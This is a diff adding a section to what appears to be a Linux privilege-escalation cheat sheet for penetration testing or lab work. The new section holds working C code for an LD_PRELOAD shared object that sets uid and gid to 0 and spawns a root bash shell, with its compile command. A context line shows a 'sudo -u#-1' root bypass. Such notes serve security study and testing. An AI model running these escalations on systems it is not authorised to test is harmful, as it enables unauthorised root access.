@@ -139,6 +139,24 @@ sudo -u#-1 /bin/bash -p
 ```
 
 
+### *LD_PRELOAD SUDO LINE:* ###
+Should your SUDO permissions include a line that has 'env_keep+=LD_PRELOAD', then you are able to load in custom code which will run when sudo is called on a valid commmand which your user has sudo access for. The loaded in code itself is run with special permissions, meaning we can set the uid and group id to escalate ourselves to another user (root).:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+
+// we compile this with 'gcc -fPIC -shared -o shell.so shell.c -nostartfiles' when our file is called shell.c
+```
+
+
 ### *Capabilities:* ###
 List all capabilities that applications have:
 ```bash
